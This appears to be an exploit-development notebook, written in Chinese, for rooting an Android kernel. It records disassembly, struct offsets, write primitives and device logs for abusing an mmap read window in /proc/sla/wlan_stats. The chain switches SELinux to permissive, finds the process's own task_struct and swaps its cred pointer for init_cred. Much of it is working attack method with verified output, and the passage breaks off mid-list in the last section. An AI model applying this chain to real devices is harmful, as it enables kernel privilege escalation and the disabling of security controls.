# 2026-09-28: 用自建物理读通道认出自己的 cred（相3..6 的靶子从"猜"变成"验"）

> **⚠ 本文 §0~§6 的承重前提(`mmap 的 offset 在走物理页 ⇒ 可逐块扫整机 RAM`)后来被真机判废 ——
> 正确结论与新的收口路线在 §7（`stats_map` 根本不看 `vm_pgoff`；窗口固定，但里面那张
> "每任务一条"的 SLA 表直接写着 `task_struct *`）。§0~§6 保留只为记下当时是怎么想错的。**

## 0. 一句话

相1（一笔指针写 ⇒ `selinux_state.enforcing=0`）已经在真机上**可复现**（sen12: `enforce 原文 [1]→[0]`
+ 两道"只有 SELinux 会拦"的关卡放开 + 设备活着）。卡住的只剩一件事：**cred 的动态地址**。
本文把它从"猜一个偏移"变成"读回来对答案"：

```
/proc/sla/wlan_stats 的 .mmap = stats_map ⇒ pfn = __pa(private_data)>>12 + vma->vm_pgoff
  ⇒ mmap 的 offset 就是**物理页号偏移**（sen12 实测：+0x1c0000 处读到的是**线性映射**的指针
    0xffffff8b1f9c00xx，而不是镜像里那份 .data ⇒ 确实在跟着物理页走）
  ⇒ 以 64 MB 为一块把 offset 往前推 = **把整机 RAM 逐块翻过来读**
  ⇒ 签名 `*(T+0x68) == (S & ~0x3fff)`（task->stack = 我们这个内核栈的基址）= 唯一指向我们自己的任务
  ⇒ 在窗口里直接读 `*(T+0x848)` = cred 的**内核 VA**
  ⇒ ★★ 决定性正对照：用同一个通道把 cred 本身读回来，里面 8 个 id 字段
     (uid,gid,suid,sgid,euid,egid,fsuid,fsgid) 必须**全部 == 本进程 getuid()/getgid()=2000**
     ⇒ 8/8 命中才允许打相3..6；不足 8/8 就一发不打。
```

## 1. 窗口基址（锚点）与"把任意线性 VA 换算成 mmap 偏移"

窗口块内按 `值 - 自身偏移` 取众数 ⇒ 得到 `WIN_BASE`，它满足 **线性 VA = WIN_BASE + 偏移**。
arm64 的线性映射对**整段 RAM** 都成立 ⇒ 同一个常数可以把任何线性 VA 换算回偏移：
`offset = VA - WIN_BASE`。这就是"把 cred 读回来"能零成本做到的原因（不需要知道 `kimage_voffset`）。
（旧版代码的接受条件写成 `(cred>>40) < 0xffffffffff` ⇒ 把 `0xffffff8bxxxxxxxx` 这种**线性映射**指针
全部判成"不像指针" ⇒ 已改成 `(cred>>48)==0xffff`；这一条本身就是上一轮"锚点不牢"的一部分原因。）

## 2. 相3..6 的落点全部改成 **8 对齐**（不赌 SCTLR.A）

形状(1) 纯零写的落点是 `*(parent+8) = 0`，`parent = pc & ~3` ⇒ 之前设计成 4 对齐
（`cred+4 / +12 / +20 / +28`）。**但内核有没有开对齐检查（`SCTLR_EL1.A`）我没在真机上证过**，
而一次对齐异常 = 当场 oops。既然一发就是 8 字节，改成不赌对齐的排法：

| 相 | 目的（8 对齐） | 一次清掉的字段 | 该发的判据（`/proc/self/status`） |
|---|---|---|---|
| 3 | `cred+0x00` | `usage` + **uid** | `Uid:` 第 1 栏 = 0 |
| 4 | `cred+0x08` | **gid** + **suid** | `Gid:` 第 1 栏 = 0 且 `Uid:` 第 3 栏(saved) = 0 |
| 5 | `cred+0x10` | **sgid** + **euid** | `Gid:` 第 3 栏 = 0 且 `Uid:` 第 2 栏(eff) = 0 |
| 6 | `cred+0x18` | **egid** + **fsuid** | `Gid:` 第 2 栏 = 0 且 `Uid:` 第 4 栏(fs) = 0 |

- `pc = dst - 8`：`cred-8`（slab 内前一格）… `cred+0x10` 全部**可读** ⇒ 满足形状(1) 的"parent 可读"。
- 前提 `*(parent+0x10) != node`：那一格是 cred 里的 id 打包值/`security` 指针，绝不等于栈地址 ✔。
- **副作用只有一个 `usage`（refcount）被清零**：`put_cred` 对 0 做 dec ⇒ 要么饱和+WARN，要么变 -1，
  **两种都不会 kfree** ⇒ 只是永久泄漏这一份 cred，不会 UAF。这正是当初否掉
  "写 `task->cred ← init_cred`" 时用到的同一条性质的**反向**用法（那次的配对写会把 init_cred 的
  usage 写成核指针那么大 ⇒ 共享 init_cred 全炸；这里是我们自己私有的 cred）。
- 刻意**不动** `cred->security`(+0x24，SELinux blob 指针) 和 `fsgid`(+0x20) ⇒ 四发正好停在 `+0x18`。
- 幂等：再打 N 发还是同一个 0 ⇒ 与"假 lock 一 boot 只能用一次"的老限制无关。

## 3. 顺手修掉的两个流程死点（都是"同一 boot 里已经 permissive"这一新状态带来的）

1. 相0（泄漏 S）里 `if (enf == '0') break;` —— 设备可能**本来就是**上一轮同一 boot 写成的 permissive，
   那样一进来就收工 ⇒ S 都漏不到。改成 `enf=='0' && !SENOFF`（sen 模式的判据在相1 之后）。
2. "尊重上轮 senfail" 的门：基线原文本来就是 `0` 时，"这一发没变化"是**预期**，不能再当成
   "这笔没落地" ⇒ 条件加 `&& enf0[0] != '0'`。
3. `auto.py`：`nofresh` 现在会从传给 pr 的参数串里排除掉（原来会原样传进去当未知参数）；
   运行超时 200s ⇒ 900s（扫描要几分钟）；stdout 强制 UTF-8（重定向到文件时会因 GBK 崩）。

## 4. ★★ 真机教训（sen13）：**泄漏相那一发绝对不能复用同一个 boot**

`nofresh` 拿 sen12 留下的"已经 permissive"的 boot 直接跑 ⇒ **相0 的第一发就重启**
（`uptime` 归零、`getenforce=Enforcing`）。原因写在 `GHOST-WRITE-SHAPES` §4 的形状(3)：
相0 的泄漏弹走的是 `parent==NULL` 分支 ⇒ `root->rb_node = T` 之后**紧跟的 enqueue 会从 T 下潜**。
同一个 boot 里前面已经打过若干发形状(1)/(2) ⇒ 假 lock 的树里留着**上一发栈地址**（陈旧 `rb_node`），
这一发的下潜就踩到了死栈 ⇒ 无界下潜 ⇒ 炸。** ⇒ 相0 每 boot 只能一次，扫描必须配 `FRESH=True` 的整轮。**

（另一个新现象：`[-] 钉到 CPU6 失败 errno=22` —— 该核此刻离线 ⇒ `EINVAL`。已给 `pin_to()`
加"从目标核向两侧逐核退让"的兜底；这跟上面那次重启没有因果关系。）

## 5. 扫描器同时给出**对照信息**（sen14 起）

每块除了找 `stack==栈基`，还统计"cred 的 8 个 id 字段全是 2000"这个 **32 字节签名**
（`0x07d007d007d007d0` 连续 4 格，起点 = `cred+4`）的出现次数与偏移。
它**不作为写靶子**（每个 shell 进程都有这么一份，认错会把**别人的**进程提成 root 而且我们的判据看不出来），
只用来回答"我这具内核里到底有几份 shell cred、它们在物理上落在哪里"，从而判断
`stack==栈基` 这条签名是不是真的没扫到。


## 6. 收尾清单（拿到 uid=0 之后必须做的事，"临时"二字的要求）

1. `core_pattern` / `modprobe_path`：**复原成进程序里读到的原值**（原来硬编码复原成 `core` /
   `/sbin/modprobe` 是不对的 —— 已改成用 `old_core`/`old_mod`）。
2. 删 `/data/local/tmp/ghost_eh`、`ghost_trig`、`ghost_root.log`、`ghost_mac`（已有）。
3. **把 `selinux_state.enforcing` 写回 1**：现在有了"任意线性 VA → mmap 偏移"的读通道，
   `selinux_state` qword0 的**原值可以原样读回来**（它就在 .data/.bss 的窗口里），
   再用同一发形状(2) 指针写把那个值写回去 ⇒ 附带收益：这一发"写回已知原值"本身就是
   "指针写通道在动态地址上仍然有效"的正对照。
4. 若 3 做不到（值读不准），就按用户授权直接 reboot —— 语义等价。

## 7. ★★ 本轮真正的突破（一手，真机）：`/proc/sla` 的过界读**白送"comm → task_struct 地址"**

### 7.1 先把本文 §0~§5 的一个承重前提判废

`stats_map@0xffffffc010f73258` 反汇编逐条读完：

```
f73268: ldr  x9,[x0,#0xd8]        ; x9 = file->private_data
f7327c: ldp  x8,x10,[x1]          ; x8=vma->vm_start  x10=vma->vm_end
f732a0: sub  x3,x10,x8            ; len = vm_end-vm_start
f732a8..f732b4: (arm64 的 __pa() 内联: 判 private_data 落在线性区还是镜像区, 选 -kimage_voffset / +(PHYS-PAGE))
f732bc: lsr  x2,x9,#12            ; pfn = __pa(private_data)>>12
f732cc: bl   remap_pfn_range(vma, vm_start, pfn, len, prot)
```

**整个函数一次都没有读 `vma->vm_pgoff`** ⇒ `mmap` 的 **offset 参数完全不生效**。
真机 `cm57/mtest.c`：offset = 0/4K/64K/1M/16M/256M/1G/4G/16G/64G ⇒ 首格全是同一个
`0x000063ec686a7379`。⇒ 本文 §0/§1 写的"把 offset 一块块往前推 = 扫整机物理内存"**是错的**，
sen14 后半段每块报同一个 `T_off`/锚点正是重复映射的证据（那一轮 8 GB"扫描"其实只看了同一段）。

真正拿到的原语是：**从 `__pa(private_data)` 起、长度任意的"连续物理页"只读窗口**
（`mmap` 要到 1 GB 成功，其中真 RAM 约 519 MB；`offset>0` 一律无效）。
窗口内 `物理偏移 o ↔ 线性映射 VA = K + o`，`K` 用"值 − 偏移"**按页对齐分桶**取众数得到
（sen14 那个 `...ffff8` 就是被"hlist_head 的 first 指向自己+8"这类表带偏成的 `K+8`；
分桶后本 boot 得到 `K=ffffff9b5f800000`，自洽 48 万格）。

### 7.2 这个窗口里有一张**每任务一条**的表，而且直接写着 `task_struct *`

`cm57/slapoke.c` 把"我们自己的 comm 标记"周围 dump 出来 ⇒ 记录**步长 72 字节**：

```
+0x00  struct task_struct *      ← 就是这个！
+0x08  u32 × 8(计数/优先级类字段, 其中能看见 120 = nice0 的 prio)
+0x28  char comm[16]             ← "kworker/u32:4." "wifi@1.0-serv" "SLA9x7Qm2Wt4Z"(我们自己) …
```

`cm57/tsfind.c` 做了一次**与这张表无关的独立验证**：在同一个窗口里按
`prio(+0xb4)==static_prio(+0xb8)∈[100,140]` + `real_cred(+0x840)==cred(+0x848)` +
`stack(+0x68)` 是页对齐核指针 三条签名找 task 形状对象 ⇒ 找到 **266 个**
（`stack` 全是 `ffffffc02xxxxx000` 这种 vmalloc 内核栈，和我们漏出的 S 同一形态）；
再把它们的地址拿去和表里的 `ptr` 对：**对上 12 个**，而且对象体内的 comm 与表里那条的 comm **一致**
（`atchdog.monitor` / `VivoBatteryStat` / `ColorSampleTrac` / `pem_bdlold` …）。

⇒ **表里的 ptr 就是 `struct task_struct *`，并且 9/27 由 `dump_obj.py init_task`+rela 定的
偏移表(`+0x68/+0xb4/+0x840/+0x848`)在真机上一并得到证实。**

### 7.3 于是最后一步不再是"猜动态地址"

```
W 线程启动时 prctl(PR_SET_NAME, "gh<pid><tid>")      ← 每轮唯一的 comm
find_self_task(mark): 窗口里精确匹配 comm ⇒ 返回那条记录的 ptr ⇒ TASK(=W 的 task_struct)
相3 = 形状(2) 指针写  *(TASK + 0x848) = init_cred + slide   判据: W 自己 getuid() == 0
相4 = 形状(2) 指针写  *(TASK + 0x840) = init_cred + slide   判据: main 读 /proc/<W_tid>/status 的 Uid/Gid 归 0
相7 = W 亲生孩子 exec `id` ⇒ uid=0(root) + 全 caps          (重启即复位, 不留持久化)
```

- 两个目的地址都是**线性映射里的可写核地址**，而且**同一 boot 内幂等**（写第 N 次还是 init_cred）。
- 形状(2) 的配对第二笔 `*(init_cred) = pc` 只把 `init_cred.usage` 改成一个核指针大小的数
  ⇒ `get/put_cred` 永不归零 ⇒ 永不 `kfree` ⇒ 不会 UAF（这正是 9/27 否决"写 init_cred"时
  用到的同一条性质，这次它落在**我们自己**这一侧，无害）。
- `cred->security`（SELinux blob）、`cap_*`、`group_info` 全部由 init_cred 自己带着 ⇒ 不用我们铺。
- 判据分两级：相3 只能由 **W 自己**观测（主观 cred 不进 /proc），相4 由 main 从外部观测
  （`/proc/<tid>/status` 取的是 real_cred）⇒ 两发各自都有硬判据，任何一发没落就**停在原地**。
- 若 `find_self_task` 命中 0 条或 >1 条 ⇒ 一发不打（标记唯一 ⇒ 理论上只应有 1 条）。

## 8. ★★ DIAG 自检相真机结果（`cm57/run_diag2.log` / 设备端 `pr.log`，slide 已解，一次成功）

先把"任意核地址上的指针写到底落不落"变成一手事实，再谈把 cred 当靶子。靶子是窗口里两页
**整页为 0 的干净页**（`Z1=ffffffbb5f8c0000`(页#64)、`Z2=ffffffbb60c30000`(页#5040)），
写完用同一个映射原样读回来核对 —— 每发形状(2) 都应当产生**两笔**可见写：

```
[DIAG] 载荷(形状2): 目的=Z1 值=Z2 假lock=ffffffc02c23bc38 prio=119
[DIAG] 相3 读回 *(Z1)=ffffffbb60c30000(=Z2 ✔)  | *(Z2)=ffffffbb5f8bfff8(=Z1-8 ✔) ⇒ 两笔都可见
[DIAG] 相4 读回 *(Z1)=ffffffbb60c2fff8(=Z2-8 ✔)| *(Z2)=ffffffbb5f8c0000(=Z1   ✔) ⇒ 两笔都可见
[DIAG] ★★★ 两发四笔写全部落地 ⇒ 任意核地址上的指针写通道坐实
```

⇒ **反汇编里 `0x74c: str x9,[x8,#8]` / `0x754: str x10,[x9]` 的语义、以及"父指针 = `pc & ~3`"
这条换算，在真机上一字不差**（第二发还把两页都改回接近 0 ⇒ 自检零副作用）。
⇒ 于是 sen15 那次"相3 打了 8 发没生效"的结论**是错的**：错在我的判据（`syscall(SYS_getuid)`
在 W 线程里返回了 -104 这种不是 uid 的值）而不是写通道本身。已改成 libc `getuid()/geteuid()`
+ `w_seq` 序号（main 只接受"这一发之后"的那次报告），并且 W 自己会把值打进日志。
⇒ 同时纠正一条证据误读：收尾那批 `id` 孩子是由 **main** fork 的，继承的是 main 的旧 cred，
所以它们报 2000 **不能**用来否定 W 的 cred 被改过（现在 W 的孩子只在相7 之后由 W 自己造）。

## 9. 另外两条一手事实

1. **同一条(线程)记录会被 SLA 抄进 3~4 张表**：`comm=[gh3aab3ac0]` 在窗口里命中 4 处
   （+516700712 / +516979240 / +516979888 / +517118792），**四处的 `task` 值完全相同**
   （`ffffffb8af73c600`）⇒ 判据从"必须只命中 1 条"改成"命中的值必须全部一致"（一致反而是更强的证据）。
2. `find_self_task` 为了"写完能读回来"**故意不 munmap** 那 1 GB 窗口；重入时必须先释放上一次的
   映射（否则每换一颗幽灵就叠 1 GB ⇒ 迟早 ENOMEM 假失败）。

## 10. sen19 一手：槽写对了，**值**是错的 ⇒ 不再用链接期算的 init_cred

sen19 第一次把"`/proc/sla` 表白送的 comm→task_struct"接进端到端链，判据换成了
W 线程自己调 libc `getuid()/geteuid()`（带 `w_seq` 序号，只接受"这一发之后"的报告）：

```
[SLA] 子进程扫完: err=0 命中=8 task=ffffff8a2ebbe900 一致=1 K=ffffff8cdf800000 ...
[SLA] ★★★ W 的 task_struct = ffffff8a2ebbe900 (8 条记录一致)
[W]   sen 相3(形状2:指针写): 目的=ffffff8a2ebbf148 值=ffffffe48e53d528
[W]   我这轮自报 tid=15062 getuid()=-118 geteuid()=0 (seq=3)
```

两条结论，一好一坏：

1. **好**：`getuid()` 从基线 2000 变成别的值 ⇒ `*(TASK+0x848)` 确实是 **W 自己的 cred 槽**
   ⇒ 表白送的 `task` 指针是真的，偏移表（`cred=+0x848`）在这具活内核上也是对的。
2. ~~**坏**：值不是能用的 cred~~ **← 这条归因是错的，见 §11：那 -118 恰恰证明值是对的。**
   当时只看到"uid 脏而 euid 干净 ⇒ 值不对"，没把形状(2) **配对写** `*(val)=pc` 算进账：
   `val` 就是我们写进 cred 槽的 init_cred，于是配对写把 8 字节 `pc = dst-8 = TASK+0x840`
   盖在 `*(init_cred)` = `usage`(低4)+`uid`(高4) 上 ⇒ uid 必然等于 `(TASK+0x840)>>32`。
   sen19 的 TASK=`ffffff8a2ebbe900` ⇒ 预测 `0xFFFFFF8A` = **-118 = 实测值**（逐位对上）。

> **§10.修正（同一晚 sen20 之后，本节第 2 条的归因是错的）**：`init_cred` 的地址**没有错**。
> 见 §11 —— uid=-118 恰好等于 `(TASK+0x840)>>32`，也就是形状(2) 第二笔 `*(right)=pc` 应当
> 产生的那个数；地址、几何、值三件事同时被这一条定量对上。真正脏的只是被配对写覆盖的
> `cred->uid` 一栏。下面"改成量众数"的处置照做了，但**结果证明众数才是假的**（§11）。

处置（不再靠算，改成**量**）：`sla_child_scan` 加 (B) 段 —— 窗口内每个 8 对齐位置都问一句
"这里是不是一个 task_struct？"（`prio@+0xb4` 与 `static_prio@+0xb8` 都在 [1,139] 且
prio<=static_prio，且 `real_cred@+0x840`、`cred@+0x848` 都是 8 对齐内核指针），
然后对 `cred` 值**取众数**。理由：这具内核有几百条内核线程，它们**共享同一份 cred
（= init_cred，uid0 + 全 caps）**，而用户态进程一条一份 ⇒ 真值必然压倒性得票，
随机假阳性的票数是 1。采信门槛 `票数>=6 且 >=3×第二名`；若众数恰好落在窗口内，
顺手读回它的 `uid/euid` 做旁证。相3/相4 改用这个**实测值**，并把"实测 vs 链接期算"的
差值打进日志（为的是把 `.rela` 那条链的误差量化，而不是悄悄换掉）。

同时补两条纪律（都是本轮真金白银换来的）：
- **一轮最多真扫 2 次**（`sla_tries`）+ **扫到就缓存**（`sla_cached`）：全量扫 = 子进程
  常驻 ~519 MB，sen18/19 各被安卓低内存杀手收走过一次（rc=137），不能拿"多扫几遍"当免费重试。
- **判据要能分清"没落"和"落错值"**：`ok = (uid==0 && euid==0)`；若 uid 离开基线但≠0
  ⇒ 判为"槽对了值错了"（`senfail=40`）**立即停相**，不再重打 —— 重打只会把同一个坏值再写一遍。

## 11. sen20 一手：定量对上"配对写盖住 uid" ⇒ 提权是**三发**而不是两发

sen20（新 boot，slide=2517a00000，正对照 435/435）把 (B) 段众数与算法值同时打出来：

```
[SLA] 子进程扫完: err=0 命中=8 task=ffffff987c432300 一致=1 K=ffffff991f800000
[SLA] (B) 窗口内候选 task 形状 = 1147 个对象; cred 众数 = ffffffe528f7edb0 得 6 票(第二名 1 票)
[SLA] (B) 对照: 链接期算法给的 init_cred = ffffffe52a33d528, 实测众数 = ffffffe528f7edb0 ⇒ 差 0x13be778
```

三条判读（逐条一手核对，不是推断）：

1. **算法值是对的。** 同构建符号表 `analysis/kallsyms_g2a88cd145def.txt` 逐字核对
   `ffffffc01293d528 D init_cred` ⇒ `LK_INIT_CRED` 一字不差；SLIDE 由窄窗口正对照钉死
   ⇒ `init_cred = ffffffe52a33d528`。
2. **众数是假的。** 把 `0xffffffe528f7edb0 - slide` 换回链接期 = `0xffffffc0115bedb0`，
   用符号表定位 = **`_etext+0x1edb0`（在 .rodata 里，根本不是 cred）**。
   ⇒ "1147 个候选"里绝大多数是筛子放过的假阳性（`prio∈[1,139]` + 两个像指针的 qword，
   对随机内存来说太松），6 票只是同一处只读数据的重复 ⇒ **窗口取众数这条判据判废**，
   降级为旁证/对照打印。
3. **sen19 的 uid=-118 是"精确命中"而不是"没落"。** `pc = parent = dst-8 = TASK+0x840`，
   第二笔 `*(right)=pc` 把 8 字节写进 `*(init_cred)` = `usage`(低4)+`uid`(高4)：
   `TASK=0xffffff8a2ebbe900` ⇒ 高 32 位 = `0xFFFFFF8A` = -118 = 实测值。
   ⇒ 槽对、值对、配对写对，**三件事由这一个数同时钉死**；缺的只是把 uid 那一栏擦回 0。

于是收口从"两发"改成**三发**（每一发都有自己的定量预言，不靠"看起来变了"）：

| 相 | 形状 | 落地 | 判据（开打前就算出来） |
|---|---|---|---|
| 3 | (2) 指针写 | `*(task+0x848)=init_cred`，副作用 `*(init_cred)=task+0x840` | W 自报 `getuid() == (task+0x840)>>32`（**不是 0**，而是这个预言值） |
| 4 | (2) 指针写 | `*(task+0x840)=init_cred`，同一副作用 | main 读 `/proc/<W_tid>/status` 的 Uid 第一栏 = 同一个预言值 |
| 5 | (1) 纯零写 | `*(init_cred)=0` ⇒ **usage=0、uid=0**；gid/euid/egid/fsuid/fsgid 与三组 caps 保持 init_cred 真值 | W 自报 uid=euid=0 **且** `/proc/<W_tid>/status` 的 Uid/Gid 八栏全 0 |
| 7 | 不 punch | — | 由 **W 自己** fork 的孩子 exec `id` 举证 `uid=0(root)` |

**为什么 `usage=0` 不会把 init_cred 放出去**（否则全内核线程的 cred 一起变 UAF）：本机 kallsyms
里有 `refcount_dec_and_test_checked` / `refcount_inc_not_zero_checked` / `refcount_warn_saturate`
⇒ **CONFIG_REFCOUNT_FULL=y**（饱和式带检测 refcount；`analysis/config_dev.txt` 里没打印，
因为 `REFCOUNT_FULL` 是无 prompt 的 `def_bool`）。饱和语义下 `dec(0)` 返回 false 且不会把 0
"复活"，`inc(0)` 只告警不增 ⇒ 计数永远回不到 1 ⇒ `put_cred()` 永远不会 `call_rcu` 释放 init_cred。
最坏只是内核日志里多几条 saturate 告警（本机读不到 dmesg，也不影响设备存活）。
这条是本相序里**唯一**真正依赖" refcount 语义"的地方，所以必须在动手前坐实，而不是事后赌。

## 12. ★「MAC 真的失效了」这个判据一直是掺假的（2026-09-28 一手基线，`cm57/macgate.c`）

为了核对 `mac_probe()` 的关卡表，在**enforcing、一发未打**的状态下跑了一次只读基线
（写入一律"原值写回"，`core_pattern` 只试 open 不写）：

```
/proc/sla/wlan_stats      stat=FAIL(Permission denied) | open=-1 EACCES      ← 真 MAC 关卡
/dev/ashmem               mode=0666 uid=0 gid=0  | open=-1 EACCES            ← 真 MAC 关卡
/proc/kcore               stat=FAIL(No such file)                             ← 节点不存在
/proc/1/environ           mode=0400 uid=0 gid=0  | open=-1 EACCES            ← DAC(0400) 挡, 不是 MAC
/dev/kmsg                 mode=0664 uid=0 gid=1000 | open=-1 EACCES          ← DAC(gid 1000 不在组)
/sys/kernel/tracing/tracing_on      mode=0666 gid=3012 | open=OK write=2     ← **enforcing 下就能写！**
/sys/kernel/tracing/buffer_size_kb  mode=0666 gid=3012 | open=OK read=[1410] ← **同上**
/sys/kernel/tracing/trace           mode=0666 gid=3012 | open=OK read=...    ← **同上**
/sys/kernel/tracing/kprobe_events   stat=FAIL EACCES (0644 root:readtracefs)  ← DAC 挡 ⇒ permissive 也没用
/proc/sys/kernel/core_pattern       stat=FAIL EACCES (0644 root:root)         ← DAC 挡
setxattr(security.ghost_test) = -1 EPERM   ← 但 permissive 之后**仍然 EPERM** ⇒ 不能当关卡
setxattr(user.ghost_test)     = 0 OK       ← 自己拥有的文件, DAC 够
```

⇒ 旧 `mac_probe()` 数的"2 道只有 SELinux 会拦的关卡"其实是 `tracing_on` + `buffer_size_kb`，
而这两格**在 enforcing 下 shell 就 open+write 成功**（0666 + shell 在 gid 3012 `readtracefs`，
本机策略允许 shell 写它们）⇒ **打之前就该是 2 格 ⇒ 那句"★★★ MAC 真的失效了 ★★★"从来没成立过**。
（回头看日志果然如此：`[MAC:before] ... 开了 2 格` —— sen16/19/20/21/22 每一轮的 before 都是 2。）

⇒ 已改：关卡只留 **`/proc/sla/wlan_stats`** 与 **`/dev/ashmem`**（这两条在 enforcing 下 EACCES、
且拦它的确实是 MAC 而不是 DAC）；`tracing_on`/`buffer_size_kb` 降级为"信息格, 不计入关卡"，
并且**一律不再写**它们（原来的 `write "1\n"` 会改 tracer 状态，虽幂等但没必要）。

⇒ 这条改动的实际意义：permissive 的真判据从此变成"能不能 open `/proc/sla/*` 或 `/dev/ashmem`"
—— 而这正好也是我们要用的通道 ⇒ **判据与用途同一格**，不再靠恒真关卡自欺。

## 13. sen24：**定量预言命中**（相3 落地、设备活着），随后被低内存杀手在 140s 收走

```
[SEN] ★★★ 2 道「只有 SELinux 会拦」的关卡放开      ← 关卡表已换成 sla+ashmem 两格(§12), 这次是真的
[SLA] (B) 采信 算法值 init_cred = ffffffd381b3d528 (kallsyms@1293d528 + slide=136f200000)
[SEN] ★★★ TASK=ffffffa22edf4600 ⇒ 相3 写 *(task+0x848)=init_cred
[W]   sen 相3(形状2:指针写): 目的=ffffffa22edf4e48 值=ffffffd381b3d528
[W]   我这轮自报 tid=14895 getuid()=-94 geteuid()=0 (seq=3)      ← 命中!
--- 运行 140.2s rc=137 ---  (设备没重启: 结尾 uptime 238s / Permissive)
```

- 开打前算出的预言是 `uid == (TASK+0x840)>>32`：`TASK=ffffffa22edf4600` ⇒ `0xFFFFFFA2` ⇒ **-94**；
  **实测 getuid() = -94**，`geteuid()=0`（init_cred 真值, 没被动过）。⇒ 这是本线**第一次**
  "预言在开打前写下、开打后逐位命中"的提权写；也再次证明 §10/§11 的机理判断成立。
- 死因不是内核：`rc=137` = SIGKILL = 安卓低内存杀手，而设备仍是 Permissive、uptime 连续。
  时间都花在 `find_self_task` 的子进程里 —— 它为了 DIAG 的读回而算 `win_anchor`
  （519MB 逐 8 字节读 + 2M 条排序）+(B) 段众数 ⇒ 几十秒 ⇒ 整个进程活到 140s 才被收。
  ⇒ 已改：`sla_child_scan(mark, mb, aux)`，**只有 DIAG 模式才算 anchor/众数/零页**；
  常规提权路径的子进程只做"touch 页 + 扫 comm 记录"就退出（几秒）。
- 顺带把 `mac_probe` 里对 tracefs 的**写**去掉（原来每轮往 `tracing_on`/`buffer_size_kb`
  写 "1\n"，虽然幂等但那是白改内核状态；§12 已证明这两格在 enforcing 下就允许）。

## 14. diag3：五发全活 + **非对齐纯零写逐位命中**（补刀相的前提钉死）

`cm57/run_diag3.log`（slide 正对照 435/435，DIAG 模式 ⇒ 相3/相4/相5 全打在窗口里两页干净零页上）：

```
[SLA] 子进程扫完: err=0 命中=8 task=ffffff862eaa4600 一致=1 K=ffffff88df800000
      Z1=ffffff88df840000 Z2=ffffff88e0858000
[DIAG] 相3 读回 *(Z1)=ffffff88e0858000 期望=ffffff88e0858000 | *(Z2)=ffffff88df83fff8 期望=ffffff88df83fff8 ✔
[DIAG] 相4 读回 *(Z1)=ffffff88e0857ff8 期望=ffffff88e0857ff8 | *(Z2)=ffffff88df840000 期望=ffffff88df840000 ✔
[W]   sen 相5(DIAG 非对齐纯零写): 落点=ffffff88df840004(非 8 对齐) 预言读回 *(Z1)=00000000e0857ff8
[DIAG] 相5 ⇒ 读回 *(Z1)=00000000e0857ff8 == 期望 ⇒ ★★★ 非对齐形状(1) 纯零写坐实
[DONE] 全流程结束(没炸)  (同一 boot 里 1 泄漏 + 1 permissive + 3 写 = 5 发, 设备活着)
```

三条结论：
1. **补刀相的前提成立**：`pc = IC-4` 这一发把 `Z1+4..Z1+11` 清零，读回值恰好是
   `(Z2-8) & 0xFFFFFFFF`（低 4 字节保留、高 4 字节归 0）⇒ 非对齐 8 字节 store 在这具内核上
   **确实可用**，于是 `*(init_cred+4)=0`（只擦 uid+gid、完全不动 usage）这条路线不是赌。
2. **一发 boot 里连打 5 发是可行的** ⇒ 相3 的高重启率**不是**"多发本来就会炸"，
   而是那一发自己的语义后果（下一步用孪生弹差分定位，见 §15）。
3. 预言→读回逐位命中的次数累计到 **6 笔**（相3/相4 各两笔 + 相5 一笔 + 相1 的 enforce 翻转），
   全部是"开打前算出来的数"。

## 15. 待判的问题：相3 六次里死五次（孪生弹差分）

同一 boot 里 相1(形状2, 目的=.bss 的 selinux_state) 几乎不炸，相3(形状2, 目的=自己 task 的
cred 槽, 值=init_cred) 却 5/6 炸。两笔写只有语义差别：

| 笔 | 相1 | 相3 |
|---|---|---|
| ①`*(dst)=val` | 改 .bss 的一个布尔字 | **换掉 W 的 cred 指针** |
| ②`*(val)=dst-8` | 写进 printk 环形缓冲(只被当字节读) | 盖住 **init_cred 的 usage+uid** ——全内核线程共享 |

`cm57/pr.c` 的 `twin` 模式 = 孪生弹：把 ①的目的换成我们自己带内的空字(`S-0x40`)，**值仍然 =
`init_cred`** ⇒ ②一模一样照做。判据 = 设备是否活着（外加 W 的 uid 仍是基线 2000，证明 ①没碰到
cred 槽）。⇒ 死了 = ②是杀手（那就换成"窗口里可读到的一份 root 私享 cred"当靶，连读回都能做）；
活着 = ①是杀手（那就要重新看"换 cred"这件事的后续后果）。

### 15.1 孪生弹差分结果（`cm57/_t1dev.log`，一轮跑完）：杀手是**换 cred 那一笔**

```
[TWIN] 孪生弹之后设备活着: W 自报 uid=2000 euid=2000 (seq 2→3)
       ⇒ 配对写盖住 init_cred **本身不炸** ⇒ 相3 的杀手 = "换掉 task->cred"那一笔
[TWIN] ⇒ 进相3 打真弹(同形状同值, 只把目的换回 task+0x848)
[h] #4 相3 即将 punch nice=19
[W] sen 相3(形状2:指针写): 目的=ffffff94ee980848 值=ffffffe17593d528   ← 之后没有日志 = 死在这一发
```

⇒ ②（`*(init_cred)=pc`，把全内核线程共享 cred 的 usage+uid 弄脏）**单独打是安全的**；
⇒ ①（`*(task+0x848)=init_cred`，真的把 W 的 cred 换成 init_cred）在 7 次里死了 5~6 次，
   但 **sen19 与 sen24 两次活下来了**（且活下来时 uid 逐位等于预言值）。
⇒ 所以 ①不是"必炸"，而是"高概率炸"：换 cred 之后内核还要在这次 punch 里继续用 W 的 task,
   而我们没有走 `commit_creds()`（没有 RCU 切换、没有把新旧 cred 的引用计数列清楚）。
   活下来的那两次说明窗口存在 ⇒ **策略：把链压到最短(4 发) + 反复打轮次(自动 grind)**,
   而不是继续加保险相（相5/相6 的 real_cred 在举证之后再补，能省则省）。

⇒ 顺带把"命中判据"写进 `cm57/grind.py`：一轮只要看到
   `主观 cred 已是 init_cred` / `uid=0(root)` 就停，否则自动重来（每轮含开机约 6 分钟）。

## 16. 靶子从 W 换成 main（`mtarget`）：把"必炸的那一笔"移到链走不碰的 task 上

孪生弹定位到"换掉**正被这条链走改动的** task 的 cred"才是杀手之后，顺理成章的改法不是加保险，
而是**换靶子**：

| | 旧（打 W） | 新（`mtarget`，打 main） |
|---|---|---|
| 谁的 `task->cred` 被换 | W —— 正是 `__sched_setscheduler`/链走正在改的那个 task | **main** —— 只是 punch 的发起者，链走不碰它的 task |
| 举证的孩子由谁生 | 必须 W 亲自 clone（main 的孩子继承的是 main 的旧 cred） | **main 自己** clone（要 root 的本来就是它） |
| 判据 | 要等 W 自报（`w_seq` 序号防读上一发残渣） | main **直接 `getuid()`** —— 少一层间接 |
| 定量预言 | `uid == (W+0x840)>>32` | 同一个式子，换成 `(main+0x840)>>32` |

实现要点（`cm57/pr.c`）：
* main 也打一个唯一 comm：`snprintf(m_mark,"gm%x",getpid())` + `prctl(PR_SET_NAME)`；
